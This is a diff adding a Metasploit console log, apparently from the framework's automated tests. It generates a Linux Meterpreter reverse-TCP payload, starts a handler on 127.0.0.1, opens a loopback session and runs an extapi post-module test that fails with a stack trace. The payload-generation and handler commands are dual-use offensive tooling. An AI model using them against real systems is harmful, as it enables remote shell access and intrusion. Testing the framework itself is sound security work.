@@ -1,0 +1,20 @@
+use linux/x64/meterpreter_reverse_tcp
+[*] Killing all sessions...
+[4mmsf6[0m post([1m[31mtest/cmd_exec[0m) [0m> [4mmsf6[0m payload([1m[31mlinux/x64/meterpreter_reverse_tcp[0m) [0m> generate -o /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220119-3396-plfbq1 -f elf MeterpreterTryToFork=false lport=6068 lhost=127.0.0.1
+[*] Writing 1037680 bytes to /tmp/meterpreter-spec-rb-linux-x---meterpreter-reverse-tcp20220119-3396-plfbq1...
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter_reverse_tcp[0m) [0m> to_handler
+[*] Payload Handler Started as Job 57
+[4mmsf6[0m payload([1m[31mlinux/x64/meterpreter_reverse_tcp[0m) [0m> 
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:6068 
+[*] Meterpreter session 58 opened (127.0.0.1:6068 -> 127.0.0.1:38946 ) at 2022-01-19 01:09:11 +0000
+use test/extapi
+[4mmsf6[0m post([1m[31mtest/extapi[0m) [0m> run session=58 addentropy=true verbose=true
+
+[*] Loading extapi extension...
+[-] Post failed: RuntimeError x86_64-linux-musl/extapi not found
+[-] Call stack:
+[-]   /home/runner/work/metasploit-framework/metasploit-framework/vendor/bundle/ruby/2.7.0/gems/metasploit_payloads-mettle-1.0.17/lib/metasploit_payloads/mettle.rb:205:in `load_extension'
+[-]   /home/runner/work/metasploit-framework/metasploit-framework/lib/rex/post/meterpreter/client_core.rb:356:in `use'
+[-]   /home/runner/work/metasploit-framework/metasploit-framework/test/modules/post/test/extapi.rb:32:in `setup'
+[*] Post module execution completed
